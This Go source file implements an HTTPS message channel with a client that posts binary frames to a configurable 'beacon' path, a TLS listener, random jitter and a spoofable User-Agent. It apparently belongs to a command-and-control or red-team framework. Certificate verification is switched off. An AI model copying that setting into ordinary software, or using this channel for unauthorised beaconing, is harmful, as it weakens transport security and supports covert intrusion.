package channels

import (
	"bytes"
	"context"
	"crypto/tls"
	"encoding/binary"
	"fmt"
	"io"
	"math/rand"
	"net/http"
	"time"
)

type HTTPChannel struct {
	config *Config
	client *http.Client
	server *http.Server
}

func newHTTPChannel(config *Config) (*HTTPChannel, error) {
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{
			InsecureSkipVerify: true,
			MinVersion:         tls.VersionTLS12,
		},
		MaxIdleConns:    1,
		IdleConnTimeout: 30 * time.Second,
	}

	client := &http.Client{
		Transport: tr,
		Timeout:   time.Duration(config.TimeoutSec) * time.Second,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}

	return &HTTPChannel{
		config: config,
		client: client,
	}, nil
}

func (h *HTTPChannel) Type() ChannelType {
	return ChannelHTTPS
}

func (h *HTTPChannel) Send(ctx context.Context, msg *Message) (*Message, error) {
	buf := newMessageBuffer(msg)

	url := fmt.Sprintf("https://%s:%d%s", h.config.HTTPAddr, h.config.HTTPSPort, h.config.BeaconPath)
	req, err := http.NewRequestWithContext(ctx, "POST", url, bytes.NewReader(buf))
	if err != nil {
		return nil, fmt.Errorf("create request: %w", err)
	}

	req.Header.Set("Content-Type", "application/octet-stream")
	if h.config.UserAgent != "" {
		req.Header.Set("User-Agent", h.config.UserAgent)
	}
	req.Header.Set("Accept", "*/*")
	req.Header.Set("Connection", "keep-alive")

	resp, err := h.client.Do(req)
	if err != nil {
		return nil, fmt.Errorf("send: %w", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return nil, fmt.Errorf("unexpected status: %d", resp.StatusCode)
	}

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, fmt.Errorf("read response: %w", err)
	}

	return parseMessageBuffer(body)
}

func (h *HTTPChannel) Listen(ctx context.Context, addr string, handler func(*Message) *Message) error {
	h.server = &http.Server{
		Addr:    addr,
		Handler: buildHTTPMux(h, handler),
	}
	_ = ctx
	return h.server.ListenAndServeTLS("", "")
}

func (h *HTTPChannel) ListenWithTLS(ctx context.Context, addr string, certFile, keyFile string, handler func(*Message) *Message) error {
	h.server = &http.Server{
		Addr:    addr,
		Handler: buildHTTPMux(h, handler),
	}
	_ = ctx
	return h.server.ListenAndServeTLS(certFile, keyFile)
}

func (h *HTTPChannel) Close() error {
	if h.server != nil {
		return h.server.Close()
	}
	return nil
}

func newMessageBuffer(msg *Message) []byte {
	buf := make([]byte, 0, 16+1+len(msg.Data))
	buf = append(buf, msg.ID[:]...)
	buf = append(buf, msg.Type)
	buf = append(buf, msg.Data...)
	return buf
}

func parseMessageBuffer(data []byte) (*Message, error) {
	if len(data) < 17 { // 16 ID + 1 type minimum
		return nil, fmt.Errorf("message too short: %d bytes", len(data))
	}

	msg := &Message{}
	copy(msg.ID[:], data[:16])
	msg.Type = data[16]
	msg.Data = make([]byte, len(data)-17)
	copy(msg.Data, data[17:])
	return msg, nil
}

func getJitter(min, max int) time.Duration {
	if min >= max {
		return time.Duration(min) * time.Second
	}
	jitter := rand.Intn(max-min) + min
	return time.Duration(jitter) * time.Second
}

func encodeUint16(v uint16) []byte {
	b := make([]byte, 2)
	binary.BigEndian.PutUint16(b, v)
	return b
}
